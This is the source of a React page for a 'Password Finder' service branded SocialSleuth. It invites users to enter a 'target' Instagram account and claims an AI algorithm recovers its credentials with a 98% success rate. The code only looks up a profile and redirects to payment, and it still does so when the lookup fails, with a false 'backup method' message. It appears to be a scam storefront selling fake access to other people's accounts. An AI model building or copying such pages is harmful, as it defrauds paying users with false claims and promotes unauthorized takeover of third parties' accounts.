
import { useState } from "react";
import { useNavigate } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { useHackerContext } from "@/context/HackerContext";
import { toast } from "sonner";
import { Lock, User, Instagram, Sparkles, ArrowRight } from "lucide-react";

const Index = () => {
  const [inputUsername, setInputUsername] = useState("");
  const [senderUsername, setSenderUsername] = useState("");
  const [loading, setLoading] = useState(false);
  const { setUsername, setSenderUsername: setContextSenderUsername, setProfileData } = useHackerContext();
  const navigate = useNavigate();

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!inputUsername) {
      toast.error("Please enter an Instagram username");
      return;
    }

    if (!senderUsername) {
      toast.error("Please enter your username");
      return;
    }
    
    setLoading(true);
    
    try {
      const response = await fetch("http://localhost:5000/get_instagram_profile", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ username: inputUsername }),
      });
      
      if (!response.ok) {
        throw new Error("Failed to fetch account data");
      }
      
      const profileData = await response.json();
      
      // Store in context
      setUsername(profileData.username);
      setContextSenderUsername(senderUsername);
      setProfileData(profileData);
      
      toast.success("Target found! Redirecting to payment...");
      
      // Skip verification and go directly to payment
      navigate("/payment");
    } catch (error) {
      console.error("Error fetching account data:", error);
      toast.error("Failed to find account. We'll use backup method.");
      
      // Even if API fails, still proceed to payment with entered usernames
      setUsername(inputUsername);
      setContextSenderUsername(senderUsername);
      
      setTimeout(() => {
        navigate("/payment");
      }, 1500);
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen flex flex-col items-center justify-center p-4 matrix-bg">
      <div className="w-full max-w-md space-y-8">
        <div className="text-center">
          <div className="flex justify-center mb-4">
            <div className="rounded-full bg-secondary p-3 shadow-[0_0_25px_rgba(0,255,170,0.6)]">
              <Lock className="h-8 w-8 text-primary animate-pulse" />
            </div>
          </div>
          <h1 
            className="text-4xl font-bold glitch" 
            data-text="Password Finder"
          >
            Password Finder
          </h1>
          <p className="mt-3 text-sm text-primary opacity-80 max-w-xs mx-auto">
            Our advanced AI algorithm recovers Instagram credentials in minutes
          </p>
          
          <div className="flex items-center justify-center gap-2 mt-4">
            <Sparkles className="h-4 w-4 text-primary" />
            <span className="text-xs text-primary font-semibold">
              98% SUCCESS RATE
            </span>
            <Sparkles className="h-4 w-4 text-primary" />
          </div>
        </div>
        
        <div className="terminal-window backdrop-blur-sm bg-opacity-80">
          <div className="terminal-header">
            <div className="terminal-button terminal-button-red"></div>
            <div className="terminal-button terminal-button-yellow"></div>
            <div className="terminal-button terminal-button-green"></div>
          </div>
          <div className="text-primary text-xs mb-4">
            <span className="text-muted-foreground">[root@secured-system]$ </span>
            <span className="type-animation">
              initializing deep scan v4.2.1...
            </span>
          </div>
          <form onSubmit={handleSubmit} className="space-y-5">
            <div className="space-y-2">
              <label className="flex items-center gap-2 text-xs text-muted-foreground mb-1">
                <Instagram className="h-3.5 w-3.5" /> TARGET ACCOUNT
              </label>
              <div className="relative">
                <span className="absolute left-3 top-1/2 transform -translate-y-1/2 text-muted-foreground">@</span>
                <Input
                  type="text"
                  placeholder="Target Instagram username"
                  value={inputUsername}
                  onChange={(e) => setInputUsername(e.target.value)}
                  className="bg-background/40 border-secondary text-foreground focus:border-primary pl-8 placeholder:text-muted-foreground/50"
                />
              </div>
            </div>
            
            <div className="space-y-2">
              <label className="flex items-center gap-2 text-xs text-muted-foreground mb-1">
                <User className="h-3.5 w-3.5" /> YOUR USERNAME
              </label>
              <div className="relative">
                <span className="absolute left-3 top-1/2 transform -translate-y-1/2 text-muted-foreground">@</span>
                <Input
                  type="text"
                  placeholder="Your Instagram username"
                  value={senderUsername}
                  onChange={(e) => setSenderUsername(e.target.value)}
                  className="bg-background/40 border-secondary text-foreground focus:border-primary pl-8 placeholder:text-muted-foreground/50"
                />
              </div>
            </div>
            
            <Button 
              type="submit" 
              className="w-full bg-primary hover:bg-primary/80 text-primary-foreground shadow-[0_0_15px_rgba(0,255,170,0.3)] group transition-all duration-300"
              disabled={loading}
            >
              {loading ? "Processing..." : "Start Recovery"} 
              <ArrowRight className="ml-2 h-4 w-4 group-hover:translate-x-1 transition-transform" />
            </Button>
          </form>
          
          <div className="flex items-center justify-center mt-6 border-t border-secondary/30 pt-4">
            <div className="text-sm text-primary animate-pulse flex items-center gap-1.5">
              <span className="inline-block w-2 h-2 bg-green-500 rounded-full"></span>
              System ready
            </div>
          </div>
        </div>
        
        <div className="text-center text-xs text-muted-foreground mt-8">
          <p>For educational purposes only. This is a simulation.</p>
          <p>© 2025 SocialSleuth. All rights reserved.</p>
        </div>
      </div>
    </div>
  );
};

export default Index;
